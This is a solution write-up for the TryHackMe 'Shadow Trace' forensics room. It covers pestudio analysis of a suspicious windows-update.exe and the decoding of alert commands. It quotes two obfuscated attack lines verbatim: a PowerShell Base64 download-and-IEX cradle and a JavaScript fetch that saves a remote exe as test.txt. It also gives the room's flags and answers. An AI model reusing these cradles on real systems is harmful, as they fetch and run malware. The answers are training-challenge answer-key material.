# [TryHackMe | Shadow Trace](https://tryhackme.com/room/shadowtrace) Challenge Room Solution Writeup

## [Task 2 | File Analysis](https://tryhackme.com/room/shadowtrace?taskNo=2)

To answer these questions, open `C:\Users\DFIRUser\Desktop\windows-update.exe` with `C:\Users\DFIRUser\DFIR Tools\pestudio\pestudio.exe`.

### What is the architecture of the binary file windows-update.exe?

`indicators: file > type` shows **64-bit**.

### What is the hash (sha-256) of the file windows-update.exe?

`indicators: file > sha256` shows **b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc**.

### Identify the URL within the file to use it as an IOC

`indicators: string > url-pattern` shows **http[:]//tryhatme[.]com/update/security-update[.]exe** (defanged).

### With the URL identified, can you spot a domain that can be used as an IOC?

`strings` shows **responses[.]tryhatme[.]com** (defanged).

### Input the decoded flag from the suspicious domain

`strings` shows `tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`. Decode this from `Base64`(e.g., via [CyberChef](https://cyberchef.org/)) `` to get **THM{you_g0t_some_IOCs_friend}**.

### What library related to socket communication is loaded by the binary?

`indicators: libraries > flag` shows **WS2_32.dll**.

## [Task 3 Alert Analysis](https://tryhackme.com/room/shadowtrace?taskNo=3)

### Can you identify the malicious URL from the trigger by the process powershell.exe?

The logged command is:

```bash
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

Identify and decode `aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl` from `Base64` (e.g., via [CyberChef](https://cyberchef.org/)) to get **https[:]//tryhatme[.]com/dev/main[.]exe** (defanged).

### Can you identify the malicious URL from the alert triggered by chrome.exe?

The logged command is:

```bash
fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join('')).then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='test.txt';document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);});
```

Use [CyberChef](https://cyberchef.org/)'s `Magic` filter to decode `104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101` as **https[:]//reallysecureupdate[.]tryhatme.com/update[.]exe** (defanged).

### What's the name of the file saved in the alert triggered by chrome.exe?

The logged command is:

```bash
fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join('')).then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='test.txt';document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);});
```

Within this one can identify **test.txt**.